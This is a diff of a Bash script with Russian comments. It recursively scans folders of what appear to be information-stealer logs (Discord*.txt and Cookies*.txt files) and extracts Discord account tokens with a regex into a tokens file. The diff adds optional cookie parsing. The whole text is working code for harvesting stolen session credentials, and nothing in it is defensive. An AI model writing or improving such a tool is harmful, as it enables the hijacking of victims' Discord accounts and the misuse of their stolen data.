@@ -2,28 +2,48 @@
 
 # Проверка аргументов
 if [[ $# -lt 2 ]]; then
-  echo "Использование: $0 <validate> <out_path> <folder1> ..."
+  echo "Использование: $0 <validate> <cookie> <out_path> <folder1> ..."
   exit 1
 fi
 
 validate=$1
-out_path=$2
-shift 2
+cookies=$2
+out_path=$3
+shift 3
 search_folders=$@
 
 # Функция поиска токенов
 function find_tokens() {
 
   for folder in "$@"; do
+
     for file in "$folder"/*; do
+
       if [[ "$file" =~ Discord.*\.txt$ ]]; then
+
         while read line; do
           echo "$line" >> "$tokens_file"
         done < "$file"
+
+      elif [[ "$file" =~ Cookies.*\.txt$ ]] ; then
+        if [[ "$cookies" == "1" ]]; then
+        while read line; do
+          token=$(echo "$line" | grep -oE '\w{24}\.\w{6}\.\w{27}')
+          if [ ! -z "$token" ]; then
+            echo "Найден токен: $token"
+            echo "$token" >> "$tokens_file"
+          fi
+        done < "$file"
+        fi
+
       elif [ -d "$file" ]; then
+
         find_tokens "$file"
+
       fi
+
     done
+
   done
 
 }
